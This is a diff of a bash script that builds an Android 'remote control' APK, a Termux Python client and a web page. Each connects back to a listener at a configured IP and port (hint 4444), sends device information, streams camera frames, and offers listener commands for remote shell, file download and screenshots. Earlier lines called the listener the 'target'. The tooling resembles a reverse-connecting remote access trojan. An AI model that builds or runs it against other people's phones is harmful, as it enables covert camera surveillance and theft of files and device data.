+    cat > "$APP_DIR/app/src/main/java/com/remote/control/MainActivity.java" << EOF
+package com.remote.control;
 
 import android.os.Bundle;
-import android.widget.TextView;
+import android.view.View;
+import android.widget.*;
 import androidx.appcompat.app.AppCompatActivity;
-import java.net.*;
-import java.io.*;
+import android.content.Intent;
+import android.graphics.Color;
 
 public class MainActivity extends AppCompatActivity {
     
-    private static final String SERVER_IP = "$LISTENER_IP";
-    private static final int SERVER_PORT = $LISTENER_PORT;
+    private EditText ipInput, portInput;
+    private Button connectBtn;
+    private TextView statusText;
+    private LinearLayout controlPanel;
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        TextView textView = new TextView(this);
-        textView.setText("Connecting to " + SERVER_IP + ":" + SERVER_PORT);
-        setContentView(textView);
+        // Main layout
+        ScrollView scrollView = new ScrollView(this);
+        LinearLayout mainLayout = new LinearLayout(this);
+        mainLayout.setOrientation(LinearLayout.VERTICAL);
+        mainLayout.setPadding(50, 50, 50, 50);
         
-        new Thread(() -> {
-            try {
-                Socket socket = new Socket(SERVER_IP, SERVER_PORT);
-                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
-                out.println("Hello from Android!");
-                runOnUiThread(() -> textView.setText("Connected!"));
-            } catch (Exception e) {
-                runOnUiThread(() -> textView.setText("Error: " + e.getMessage()));
-            }
-        }).start();
+        // Title
+        TextView title = new TextView(this);
+        title.setText("📱 Remote Control");
+        title.setTextSize(28);
+        title.setTextColor(Color.parseColor("#2196F3"));
+        title.setPadding(0, 0, 0, 30);
+        mainLayout.addView(title);
+        
+        // Subtitle
+        TextView subtitle = new TextView(this);
+        subtitle.setText("Connect to your computer");
+        subtitle.setTextSize(16);
+        subtitle.setTextColor(Color.GRAY);
+        subtitle.setPadding(0, 0, 0, 30);
+        mainLayout.addView(subtitle);
+        
+        // IP Input
+        TextView ipLabel = new TextView(this);
+        ipLabel.setText("Server IP Address:");
+        ipLabel.setTextSize(14);
+        ipLabel.setPadding(0, 10, 0, 5);
+        mainLayout.addView(ipLabel);
+        
+        ipInput = new EditText(this);
+        ipInput.setText("$LISTENER_IP");
+        ipInput.setHint("e.g., 192.168.1.100");
+        ipInput.setPadding(15, 10, 15, 10);
+        ipInput.setBackgroundResource(android.R.drawable.editbox_background);
+        mainLayout.addView(ipInput);
+        
+        // Port Input
+        TextView portLabel = new TextView(this);
+        portLabel.setText("Port:");
+        portLabel.setTextSize(14);
+        portLabel.setPadding(0, 20, 0, 5);
+        mainLayout.addView(portLabel);
+        
+        portInput = new EditText(this);
+        portInput.setText("$LISTENER_PORT");
+        portInput.setHint("e.g., 4444");
+        portInput.setInputType(2);
+        portInput.setPadding(15, 10, 15, 10);
+        portInput.setBackgroundResource(android.R.drawable.editbox_background);
+        mainLayout.addView(portInput);
+        
+        // Connect Button
+        connectBtn = new Button(this);
+        connectBtn.setText("CONNECT");
+        connectBtn.setTextSize(16);
+        connectBtn.setTextColor(Color.WHITE);
+        connectBtn.setBackgroundColor(Color.parseColor("#4CAF50"));
+        connectBtn.setPadding(0, 15, 0, 15);
+        connectBtn.setLayoutParams(new LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT,
+            LinearLayout.LayoutParams.WRAP_CONTENT));
+        mainLayout.addView(connectBtn);
+        
+        // Status
+        statusText = new TextView(this);
+        statusText.setText("Not connected");
+        statusText.setTextSize(14);
+        statusText.setPadding(0, 20, 0, 10);
+        statusText.setTextColor(Color.GRAY);
+        mainLayout.addView(statusText);
+        
+        // Control Panel (initially hidden)
+        controlPanel = new LinearLayout(this);
+        controlPanel.setOrientation(LinearLayout.VERTICAL);
+        controlPanel.setVisibility(View.GONE);
+        
+        // Separator
+        View separator = new View(this);
+        separator.setLayoutParams(new LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT, 2));
+        separator.setBackgroundColor(Color.LTGRAY);
+        controlPanel.addView(separator);
+        
+        // Control title
+        TextView controlTitle = new TextView(this);
+        controlTitle.setText("Controls");
+        controlTitle.setTextSize(18);
+        controlTitle.setTextColor(Color.parseColor("#2196F3"));
+        controlTitle.setPadding(0, 20, 0, 10);
+        controlPanel.addView(controlTitle);
+        
+        // Button grid
+        GridLayout grid = new GridLayout(this);
+        grid.setColumnCount(2);
+        grid.setRowCount(3);
+        
+        String[] buttons = {"📹 Stream", "⏹ Stop", "📁 Files", "ℹ Info", "📸 Screenshot", "🔧 Shell"};
+        for (String text : buttons) {
+            Button btn = new Button(this);
+            btn.setText(text);
+            btn.setTextSize(12);
+            btn.setPadding(10, 10, 10, 10);
+            
+            GridLayout.LayoutParams params = new GridLayout.LayoutParams();
+            params.width = 0;
+            params.height = GridLayout.LayoutParams.WRAP_CONTENT;
+            params.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
+            params.setMargins(5, 5, 5, 5);
+            btn.setLayoutParams(params);
+            
+            btn.setOnClickListener(v -> {
+                String cmd = text.split(" ")[1].toLowerCase();
+                Intent intent = new Intent(this, RemoteService.class);
+                intent.putExtra("command", cmd);
+                startService(intent);
+            });
+            
+            grid.addView(btn);
+        }
+        controlPanel.addView(grid);
+        
+        mainLayout.addView(controlPanel);
+        scrollView.addView(mainLayout);
+        setContentView(scrollView);
+        
+        // Connect button click
+        connectBtn.setOnClickListener(v -> {
+            String ip = ipInput.getText().toString();
+            int port = Integer.parseInt(portInput.getText().toString());
+            
+            Intent intent = new Intent(this, RemoteService.class);
+            intent.putExtra("ip", ip);
+            intent.putExtra("port", port);
+            startService(intent);
+            
+            statusText.setText("Connecting to " + ip + ":" + port);
+            statusText.setTextColor(Color.parseColor("#FF9800"));
+            controlPanel.setVisibility(View.VISIBLE);
+        });
     }
 }
 EOF
 
-    # Create layout
-    cat > "$PROJECT_DIR/app/src/main/res/layout/activity_main.xml" << EOF
-<?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    android:layout_width="match_parent"
-    android:layout_height="match_parent"
-    android:orientation="vertical">
-    <TextView
-        android:id="@+id/statusText"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Starting..."
-        android:textSize="18sp"/>
-</LinearLayout>
+    # Create RemoteService.java
+    cat > "$APP_DIR/app/src/main/java/com/remote/control/RemoteService.java" << EOF
+package com.remote.control;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import android.util.Log;
+import java.io.*;
+import java.net.*;
+import android.widget.Toast;
+import android.os.Handler;
+import android.os.Looper;
+
+public class RemoteService extends Service {
+    private static final String TAG = "RemoteService";
+    private Socket socket;
+    private PrintWriter out;
+    private DataOutputStream dataOut;
+    private Thread connectionThread;
+    private boolean connected = false;
+    
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        String ip = intent.getStringExtra("ip");
+        int port = intent.getIntExtra("port", $LISTENER_PORT);
+        String command = intent.getStringExtra("command");
+        
+        if (command != null) {
+            sendCommand(command);
+        } else {
+            connectToServer(ip, port);
+        }
+        
+        return START_STICKY;
+    }
+    
+    private void connectToServer(String ip, int port) {
+        connectionThread = new Thread(() -> {
+            try {
+                socket = new Socket(ip, port);
+                out = new PrintWriter(socket.getOutputStream(), true);
+                dataOut = new DataOutputStream(socket.getOutputStream());
+                connected = true;
+                
+                showToast("Connected to " + ip);
+                
+                // Send device info
+                String info = android.os.Build.MODEL + "|" + 
+                             android.os.Build.VERSION.RELEASE;
+                out.println("INFO:" + info);
+                
+                // Listen for commands
+                BufferedReader in = new BufferedReader(
+                    new InputStreamReader(socket.getInputStream()));
+                String command;
+                while ((command = in.readLine()) != null) {
+                    handleCommand(command);
+                }
+                
+            } catch (Exception e) {
+                showToast("Connection failed: " + e.getMessage());
+                Log.e(TAG, "Connection error", e);
+            }
+        });
+        connectionThread.start();
+    }
+    
+    private void handleCommand(String command) {
+        if (command.equals("START_STREAM")) {
+            showToast("Starting stream...");
+        } else if (command.equals("STOP_STREAM")) {
+            showToast("Stopping stream...");
+        } else if (command.equals("PING")) {
+            out.println("PONG");
+        }
+    }
+    
+    private void sendCommand(String cmd) {
+        if (out != null) {
+            if (cmd.equals("stream")) {
+                out.println("START_STREAM");
+            } else if (cmd.equals("stop")) {
+                out.println("STOP_STREAM");
+            } else if (cmd.equals("info")) {
+                out.println("INFO");
+            }
+        }
+    }
+    
+    private void showToast(final String message) {
+        new Handler(Looper.getMainLooper()).post(() -> 
+            Toast.makeText(RemoteService.this, message, Toast.LENGTH_SHORT).show()
+        );
+    }
+    
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+    
+    @Override
+    public void onDestroy() {
+        connected = false;
+        try {
+            if (socket != null) socket.close();
+        } catch (Exception e) {}
+        super.onDestroy();
+    }
+}
 EOF
 
-    echo -e "${GREEN}✓ Android Studio project created at: $PROJECT_DIR${NC}"
-    echo ""
-    echo -e "${YELLOW}To build:${NC}"
-    echo "1. Open Android Studio"
-    echo "2. File -> Open -> $PROJECT_DIR"
-    echo "3. Wait for Gradle sync"
-    echo "4. Click Run (green triangle)"
-    echo ""
+    # Create styles
+    cat > "$APP_DIR/app/src/main/res/values/styles.xml" << EOF
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <style name="AppTheme" parent="Theme.AppCompat.Light.DarkActionBar">
+        <item name="colorPrimary">#2196F3</item>
+        <item name="colorPrimaryDark">#1976D2</item>
+        <item name="colorAccent">#4CAF50</item>
+    </style>
+</resources>
+EOF
+
+    # Create proguard-rules.pro
+    cat > "$APP_DIR/app/proguard-rules.pro" << EOF
+-keep class com.remote.control.** { *; }
+-dontwarn android.**
+EOF
+
+    # Create gradle wrapper
+    cd "$APP_DIR"
+    gradle wrapper > /dev/null 2>&1
     
-    read -p "Press Enter to continue..."
+    # Build the APK
+    echo -e "${YELLOW}Building APK (this may take a minute)...${NC}"
+    ./gradlew assembleRelease > /dev/null 2>&1
+    
+    # Check if build succeeded and copy to Desktop
+    if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
+        cp "app/build/outputs/apk/release/app-release.apk" "$APK_OUTPUT"
+        echo -e "${GREEN}✓ APK built successfully!${NC}"
+        echo -e "${GREEN}✓ APK saved to: $APK_OUTPUT${NC}"
+    else
+        echo -e "${RED}Failed to build APK automatically.${NC}"
+        echo -e "${YELLOW}Creating Android Studio project instead...${NC}"
+        
+        # Create ZIP of project on Desktop
+        cd "$CONFIG_DIR"
+        zip -r "$DESKTOP_DIR/RemoteControl-Project.zip" "RemoteApp" > /dev/null
+        echo -e "${GREEN}✓ Project saved to: $DESKTOP_DIR/RemoteControl-Project.zip${NC}"
+        echo -e "${YELLOW}Open this project in Android Studio and click Run${NC}"
+    fi
+    
+    cd "$DESKTOP_DIR"
 }
 
-# Main menu
+# =============================================
+# PART 3: SIMPLE PYTHON CLIENT FOR TERMUX
+# =============================================
+
+build_termux_client() {
+    cat > "$DESKTOP_DIR/termux_client.py" << EOF
+#!/usr/bin/env python3
+"""
+Termux Client - Run this on your Android phone
+Copy this file to your phone and run in Termux
+"""
+
+import socket
+import cv2
+import numpy as np
+import struct
+import threading
+import time
+import os
+
+# === CONFIGURATION - CHANGE THESE ===
+SERVER_IP = "$LISTENER_IP"
+SERVER_PORT = $LISTENER_PORT
+# ====================================
+
+class RemoteClient:
+    def __init__(self):
+        self.socket = None
+        self.running = True
+        self.camera = None
+        self.streaming = False
+    
+    def connect(self):
+        try:
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.connect((SERVER_IP, SERVER_PORT))
+            print(f"\033[92m[+] Connected to {SERVER_IP}:{SERVER_PORT}\033[0m")
+            
+            # Send device info
+            info = f"INFO:{os.environ.get('MODEL', 'Android')}|Android"
+            self.socket.send((info + "\n").encode())
+            return True
+        except Exception as e:
+            print(f"\033[91m[-] Connection failed: {e}\033[0m")
+            return False
+    
+    def start_stream(self):
+        self.streaming = True
+        self.camera = cv2.VideoCapture(1)  # 0 for back camera
+        
+        while self.streaming and self.running:
+            try:
+                ret, frame = self.camera.read()
+                if ret:
+                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
+                    data = buffer.tobytes()
+                    
+                    self.socket.send(struct.pack('!I', len(data)))
+                    self.socket.send(data)
+                    
+                    cv2.imshow('Sending...', frame)
+                    if cv2.waitKey(1) & 0xFF == ord('q'):
+                        break
+                time.sleep(0.03)
+            except Exception as e:
+                print(f"Stream error: {e}")
+                break
+    
+    def run(self):
+        if not self.connect():
+            return
+        
+        while self.running:
+            cmd = input("> ")
+            if cmd == "stream":
+                self.socket.send(b"START_STREAM\n")
+                threading.Thread(target=self.start_stream).start()
+            elif cmd == "stop":
+                self.socket.send(b"STOP_STREAM\n")
+                self.streaming = False
+            elif cmd == "exit":
+                self.running = False
+                break
+        
+        if self.camera:
+            self.camera.release()
+        cv2.destroyAllWindows()
+        self.socket.close()
+
+if __name__ == "__main__":
+    client = RemoteClient()
+    client.run()
+EOF
+
+    echo -e "${GREEN}✓ Termux client saved to: $DESKTOP_DIR/termux_client.py${NC}"
+}
+
+# =============================================
+# PART 4: SIMPLE WEBSITE FOR ONLINE BUILDERS
+# =============================================
+
+build_webpage() {
+    cat > "$DESKTOP_DIR/remote_control.html" << EOF
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Remote Control</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 32px;
+        }
+        .info-box {
+            background: rgba(255,255,255,0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 18px;
+        }
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+        }
+        button {
+            padding: 20px;
+            font-size: 18px;
+            border: none;
+            border-radius: 10px;
+            background: white;
+            color: #667eea;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .stream-btn { background: #ff6b6b; color: white; }
+        .stop-btn { background: #feca57; color: white; }
+        .status {
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            font-family: monospace;
+            text-align: center;
+        }
+        .ip-display {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 Remote Control</h1>
+        
+        <div class="info-box">
+            <div>Connecting to:</div>
+            <div class="ip-display">$LISTENER_IP:$LISTENER_PORT</div>
+        </div>
+        
+        <div class="button-grid">
+            <button onclick="sendCommand('stream')" class="stream-btn">▶ START STREAM</button>
+            <button onclick="sendCommand('stop')" class="stop-btn">⏹ STOP STREAM</button>
+            <button onclick="sendCommand('info')">ℹ DEVICE INFO</button>
+            <button onclick="sendCommand('ping')">🏓 PING</button>
+            <button onclick="sendCommand('screenshot')">📸 SCREENSHOT</button>
+            <button onclick="sendCommand('shell ls')">📁 LIST FILES</button>
+        </div>
+        
+        <div class="status" id="status">
+            Ready to connect...
+        </div>
+    </div>
+    
+    <script>
+        const serverUrl = 'http://$LISTENER_IP:$LISTENER_PORT';
+        const statusEl = document.getElementById('status');
+        
+        function sendCommand(cmd) {
+            statusEl.innerHTML = `Sending: \${cmd}...`;
+            statusEl.style.background = 'rgba(255,193,7,0.3)';
+            
+            fetch(`\${serverUrl}/\${cmd}`)
+                .then(response => response.text())
+                .then(data => {
+                    statusEl.innerHTML = `Response: \${data}`;
+                    statusEl.style.background = 'rgba(76,175,80,0.3)';
+                })
+                .catch(error => {
+                    statusEl.innerHTML = `Error: \${error}`;
+                    statusEl.style.background = 'rgba(244,67,54,0.3)';
+                });
+        }
+        
+        // Check connection every 5 seconds
+        function checkConnection() {
+            fetch(`\${serverUrl}/ping`)
+                .then(response => response.text())
+                .then(data => {
+                    statusEl.innerHTML = '✅ Connected';
+                    statusEl.style.background = 'rgba(76,175,80,0.3)';
+                })
+                .catch(error => {
+                    statusEl.innerHTML = '❌ Disconnected';
+                    statusEl.style.background = 'rgba(244,67,54,0.3)';
+                });
+        }
+        
+        checkConnection();
+        setInterval(checkConnection, 5000);
+    </script>
+</body>
+</html>
+EOF
+
+    echo -e "${GREEN}✓ Webpage saved to: $DESKTOP_DIR/remote_control.html${NC}"
+    echo -e "${YELLOW}Use this with online APK builders like appsgeyser.com${NC}"
+}
+
+# =============================================
+# PART 5: MAIN MENU
+# =============================================
+
+show_header() {
+    clear
+    echo -e "${BLUE}"
+    echo "╔════════════════════════════════════════════════════════╗"
+    echo "║     ANDROID REMOTE CONTROL - DESKTOP EDITION          ║"
+    echo "║     All files saved to your DESKTOP                   ║"
+    echo "╚════════════════════════════════════════════════════════╝"
+    echo -e "${NC}"
+    echo -e "Desktop location: ${GREEN}$DESKTOP_DIR${NC}\n"
+}
+
+configure_settings() {
+    show_header
+    echo -e "${CYAN}=== CONFIGURATION ===${NC}\n"
+    
+    # Get local IP
+    LOCAL_IP=$(hostname -I | awk '{print $1}')
+    echo -e "Your computer's IP: ${GREEN}$LOCAL_IP${NC}"
+    
+    # Load saved settings
+    if [ -f "$CONFIG_DIR/settings.conf" ]; then
+        source "$CONFIG_DIR/settings.conf"
+        echo -e "Saved IP: ${YELLOW}$SAVED_IP${NC}"
+        echo -e "Saved Port: ${YELLOW}$SAVED_PORT${NC}"
+        LISTENER_IP="$SAVED_IP"
+        LISTENER_PORT="$SAVED_PORT"
+    fi
+    
+    echo ""
+    read -p "Enter IP address [$LISTENER_IP]: " input_ip
+    LISTENER_IP=${input_ip:-$LISTENER_IP}
+    
+    read -p "Enter port number [$LISTENER_PORT]: " input_port
+    LISTENER_PORT=${input_port:-$LISTENER_PORT}
+    
+    # Save settings
+    echo "SAVED_IP=$LISTENER_IP" > "$CONFIG_DIR/settings.conf"
+    echo "SAVED_PORT=$LISTENER_PORT" >> "$CONFIG_DIR/settings.conf"
+    
+    # Update listener with new port
+    create_listener
+    
+    echo -e "${GREEN}✓ Settings saved: $LISTENER_IP:$LISTENER_PORT${NC}"
+    sleep 2
+}
+
+start_listener() {
+    show_header
+    echo -e "${CYAN}=== STARTING LISTENER ===${NC}\n"
+    echo -e "Listening on port: ${GREEN}$LISTENER_PORT${NC}"
+    echo -e "Your IP: ${GREEN}$LISTENER_IP${NC}"
+    echo -e "Files will be saved to: ${GREEN}$DESKTOP_DIR${NC}"
+    echo -e "\n${YELLOW}Commands when device connects:${NC}"
+    echo "  stream     - Start video streaming"
+    echo "  stop       - Stop streaming"
+    echo "  shell <cmd>- Run command"
+    echo "  get <file> - Download file to Desktop"
+    echo "  ls         - List files"
+    echo "  info       - Device info"
+    echo "  ping       - Test connection"
+    echo "  exit       - Disconnect"
+    echo ""
+    read -p "Press Enter to start listener (Ctrl+C to stop)..."
+    
+    cd "$CONFIG_DIR"
+    python3 listener.py
+}
+
 main_menu() {
     while true; do
         show_header
@@ -769,52 +1126,86 @@ main_menu() {
             PORT_STATUS="${RED}Not set${NC}"
         fi
         
-        echo -e "Current target: IP: $IP_STATUS  |  Port: $PORT_STATUS\n"
+        echo -e "Current settings: IP: $IP_STATUS  |  Port: $PORT_STATUS\n"
         
-        echo -e "${CYAN}╔════════════════════════════════════════╗${NC}"
-        echo -e "${CYAN}║     CHOOSE HOW TO BUILD YOUR APK      ║${NC}"
-        echo -e "${CYAN}╠════════════════════════════════════════╣${NC}"
-        echo -e "${CYAN}║${NC}  1) SIMPLE APK - Automatic build     ${CYAN}║${NC}"
-        echo -e "${CYAN}║${NC}  2) WEBVIEW APK - HTML interface     ${CYAN}║${NC}"
-        echo -e "${CYAN}║${NC}  3) TERMUX - Run Python on phone     ${CYAN}║${NC}"
-        echo -e "${CYAN}║${NC}  4) MIT APP INVENTOR - Visual blocks ${CYAN}║${NC}"
-        echo -e "${CYAN}║${NC}  5) ONLINE BUILDER - Web services    ${CYAN}║${NC}"
-        echo -e "${CYAN}║${NC}  6) ANDROID STUDIO - Full project    ${CYAN}║${NC}"
-        echo -e "${CYAN}╠════════════════════════════════════════╣${NC}"
-        echo -e "${CYAN}║${NC}  7) Configure IP & Port              ${CYAN}║${NC}"
-        echo -e "${CYAN}║${NC}  8) Install Dependencies             ${CYAN}║${NC}"
-        echo -e "${CYAN}║${NC}  9) Exit                              ${CYAN}║${NC}"
-        echo -e "${CYAN}╚════════════════════════════════════════╝${NC}"
+        echo -e "${WHITE}╔════════════════════════════════════════╗${NC}"
+        echo -e "${WHITE}║           MAIN MENU                    ║${NC}"
+        echo -e "${WHITE}╠════════════════════════════════════════╣${NC}"
+        echo -e "${WHITE}║${NC}  ${CYAN}1)${NC}  START LISTENER                  ${WHITE}║${NC}"
+        echo -e "${WHITE}║${NC}  ${CYAN}2)${NC}  BUILD APK (saves to Desktop)    ${WHITE}║${NC}"
+        echo -e "${WHITE}║${NC}  ${CYAN}3)${NC}  CREATE TERMUX CLIENT            ${WHITE}║${NC}"
+        echo -e "${WHITE}║${NC}  ${CYAN}4)${NC}  CREATE WEB PAGE                 ${WHITE}║${NC}"
+        echo -e "${WHITE}║${NC}  ${CYAN}5)${NC}  CONFIGURE IP & PORT             ${WHITE}║${NC}"
+        echo -e "${WHITE}║${NC}  ${CYAN}6)${NC}  SHOW CONNECTION INFO            ${WHITE}║${NC}"
+        echo -e "${WHITE}║${NC}  ${RED}7)${NC}  EXIT                            ${WHITE}║${NC}"
+        echo -e "${WHITE}╚════════════════════════════════════════╝${NC}"
         echo ""
-        read -p "Enter number [1-9]: " choice
+        read -p "Enter number [1-7]: " choice
         
         case $choice in
-            1) 
+            1)
                 if [ -f "$CONFIG_DIR/settings.conf" ]; then
-                    build_simple_apk
+                    start_listener
                 else
-                    echo -e "${RED}Please configure IP and port first (Option 7)${NC}"
+                    echo -e "${RED}Please configure IP and port first (Option 5)${NC}"
                     sleep 2
                 fi
                 ;;
-            2) build_webview_apk ;;
-            3) build_termux_apk ;;
-            4) build_mit_app ;;
-            5) build_online_apk ;;
-            6) build_studio_template ;;
-            7) configure_ip_port ;;
-            8) install_dependencies ;;
-            9) 
-                echo -e "\n${GREEN}Goodbye!${NC}"
-                exit 0 
+            2)
+                if [ -f "$CONFIG_DIR/settings.conf" ]; then
+                    build_full_apk
+                    read -p "Press Enter to continue..."
+                else
+                    echo -e "${RED}Please configure IP and port first (Option 5)${NC}"
+                    sleep 2
+                fi
                 ;;
-            *) 
+            3)
+                if [ -f "$CONFIG_DIR/settings.conf" ]; then
+                    build_termux_client
+                    read -p "Press Enter to continue..."
+                else
+                    echo -e "${RED}Please configure IP and port first (Option 5)${NC}"
+                    sleep 2
+                fi
+                ;;
+            4)
+                if [ -f "$CONFIG_DIR/settings.conf" ]; then
+                    build_webpage
+                    read -p "Press Enter to continue..."
+                else
+                    echo -e "${RED}Please configure IP and port first (Option 5)${NC}"
+                    sleep 2
+                fi
+                ;;
+            5) configure_settings ;;
+            6)
+                show_header
+                echo -e "${GREEN}=== CONNECTION INFO ===${NC}\n"
+                echo "Your IP: $(hostname -I | awk '{print $1}')"
+                echo "Configured IP: $LISTENER_IP"
+                echo "Port: $LISTENER_PORT"
+                echo "Desktop: $DESKTOP_DIR"
+                echo ""
+                echo "Files on Desktop:"
+                ls -la "$DESKTOP_DIR"/*.apk "$DESKTOP_DIR"/*.py "$DESKTOP_DIR"/*.html 2>/dev/null | sed 's/^/  /'
+                echo ""
+                read -p "Press Enter..."
+                ;;
+            7)
+                echo -e "\n${GREEN}Goodbye! Files saved to: $DESKTOP_DIR${NC}"
+                exit 0
+                ;;
+            *)
                 echo -e "${RED}Invalid option${NC}"
                 sleep 2
                 ;;
         esac
     done
 }
+
+# Create initial listener
+create_listener
 
 # Start the menu
 main_menu
